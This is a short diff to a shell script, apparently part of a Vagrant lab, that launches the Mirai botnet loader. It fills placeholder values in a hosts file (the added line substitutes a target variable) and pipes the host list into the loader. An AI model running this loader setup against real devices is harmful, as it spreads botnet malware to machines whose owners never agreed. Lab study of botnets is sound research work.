@@ -8,4 +8,5 @@ echo ">>> Startig loader..."
 cd /vagrant/mirai/loader
 cp /vagrant/configs/hosts.txt /vagrant/mirai/loader/bins/
 sed -i "s|{ip_prx}|$ip_prx|g;" /vagrant/mirai/loader/bins/hosts.txt
+sed -i "s|{tgt_psx}|$tgt_psx|g;" /vagrant/mirai/loader/bins/hosts.txt
 ./reports /vagrant/mirai/loader/bins/hosts.txt | ./loader
